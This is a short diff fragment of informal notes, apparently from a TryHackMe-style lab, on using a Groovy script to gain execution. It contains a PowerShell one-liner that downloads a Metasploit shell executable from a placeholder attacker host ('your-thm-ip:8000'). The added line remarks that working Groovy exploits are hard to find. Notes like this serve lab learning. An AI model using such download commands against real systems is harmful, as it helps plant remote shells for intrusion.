@@ -11,4 +11,4 @@ this is some sort of "groovyscript" which is kinda useful for whats going on rn
 another thing you could download is a msfshell which is like the following command:
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
 
-
+its pretty tough to find a working groovyscript exploit because most dont work and they depend on what system you're working with.
